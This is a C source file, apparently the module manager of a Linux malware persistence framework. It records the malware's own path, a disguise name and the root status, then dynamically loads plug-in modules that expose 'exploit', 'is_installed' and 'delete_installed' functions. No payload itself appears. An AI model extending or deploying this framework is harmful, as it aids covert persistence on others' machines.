#pragma region RequiredLibraries

	#include <stdio.h>
	#include <stdlib.h>
	#include <string.h>
	#include "../../headers/library/persistency_hub.h"
	#include "../../headers/errors/codes.h"

#pragma endregion

#pragma region FunctionDefinitions

#pragma region GlobalVariables

	FILE *global_logger = NULL;

#pragma endregion

#pragma region Environment

int set_environment(ENVIRONMENT **env, OPERATING_SYSTEM os, ARCHITECTURE arch, ROOTED_STATE is_root, const char *abs_path_to_malware, const char *fake_name, const char *log_filename){

	// Allocate the ENVIRONMENT object
	*env = (ENVIRONMENT *)calloc(1, sizeof(ENVIRONMENT));
	if (env == NULL)
		return ERROR_OPERATING_SYSTEM_UNABLE_TO_ALLOCATE;

	// Copy the object members
	(*env)->operating_system = os;
	(*env)->architecture = arch;
	(*env)->is_root = is_root;

	// Copy the malware path
	copy_string(&(*env)->malware_path, abs_path_to_malware, 0);

	// Copy the parent path
	copy_string(&(*env)->working_directory, abs_path_to_malware, 0);
	get_parent_folder_path((*env)->working_directory);

	// Change directory
	change_working_directory((*env)->working_directory);

	// Set the fake name
	copy_string(&(*env)->fake_name, fake_name, 0);

	// Copy the log filename
	if (log_filename != NULL){
		copy_string(&(*env)->log_filename, log_filename, 0);
		open_log_file(&global_logger, log_filename);
	}

	// Return
	return 0;

}

int autoset_environment(ENVIRONMENT **env, const char *fake_name, const char *log_filename){

	ARCHITECTURE arch;
	ROOTED_STATE is_root;
	char *malware_path = NULL;

	// Get architecture
	get_system_details(ARCHITECTURE_BITS, &arch);

	// Check root
	get_system_details(ROOT_CHECK, &is_root);

	// Get path
	get_executable_path(&malware_path);

	// Init the environment
	set_environment(env, LINUX, arch, is_root, malware_path, fake_name, log_filename);

	// Free
	free(malware_path);

	// Return
	return 0;

}

int free_environment(ENVIRONMENT **env){

	// Free members and objects
	if (*env != NULL){
		free((*env)->malware_path);
		free((*env)->working_directory);
		free((*env)->fake_name);
		free(*env);
		if (global_logger != NULL)
			free_log_file(global_logger);
		*env = NULL;
	}

	// Return
	return 0;

}

int log_message(const char *message){

	int ret_val;

	ret_val = write_log_message(global_logger, message);

	// Return
	return ret_val;

}

#pragma endregion

#pragma region ModuleWallet

int get_all_modules(MODULE_WALLET **wallet){

	char *extension_ptr;
	int i;

	// Allocate the wallet
	*wallet = (MODULE_WALLET *)calloc(1, sizeof(MODULE_WALLET));

	// Get all filenames
	get_all_files_from_folder(MODULES_FOLDER, &(*wallet)->count, &(*wallet)->names, MAX_MODULES, MODULE_EXTENSION);

	// Process the filenames
	for (i = 0; i < (*wallet)->count; i++){
		extension_ptr = strstr(((*wallet)->names)[i], MODULE_EXTENSION);
		if (extension_ptr != NULL)
			*extension_ptr = '\0';
	}

	// Return
	return 0;

}

int free_module_wallet(MODULE_WALLET **wallet){

	int i;

	if (*wallet != NULL){
		for (i = 0; i < MAX_MODULES; i++){
			free((*wallet)->names[i]);
		}
		free((*wallet)->names);
		free(*wallet);
		*wallet = NULL;
	}

	// Return
	return 0;

}

#pragma endregion

#pragma region Module

int is_module_present(MODULE_WALLET *wallet, const char *name){

	int i;

	// Check arguments
	if (wallet == NULL || name == NULL)
		return ERROR_PROGRAMMING_INVALID_ARGUMENT;

	// Iterate the wallet
	for (i = 0; i < wallet->count; i++){
		if (strcmp(wallet->names[i], name) == 0)
			return 1;
	}

	// Return
	return ERROR_MODULE_MANAGER_NOT_FOUND;

}

int load_module(LOADED_MODULE **module, const char *name){

	// Allocate the module
	*module = (LOADED_MODULE *)calloc(1, sizeof(LOADED_MODULE));

	// Copy the name and add extension
	copy_string(&(*module)->name, name, 3);
	strcat((*module)->name, MODULE_EXTENSION);

	// Load module
	load_library((*module)->name, &(*module)->handle);

	// Get function pointers
	get_function_pointer((*module)->handle, FUNC_NAME_IS_COMPATIBLE, (FUNC_PTR *)&(*module)->is_compatible);
	get_function_pointer((*module)->handle, FUNC_NAME_EXPLOIT, (FUNC_PTR *)&(*module)->exploit);
	get_function_pointer((*module)->handle, FUNC_NAME_IS_INSTALLED, (FUNC_PTR *)&(*module)->is_installed);
	get_function_pointer((*module)->handle, FUNC_NAME_DELETE_INSTALLED, (FUNC_PTR *)&(*module)->delete_installed);

	// Return
	return 0;

}

int unlink_module(LOADED_MODULE **module){

	// Unlink the handle
	unlink_library(&(*module)->handle);

	// Free
	free((*module)->name);
	free(*module);
	*module = NULL;

	// Return
	return 0;

}

#pragma endregion

#pragma endregion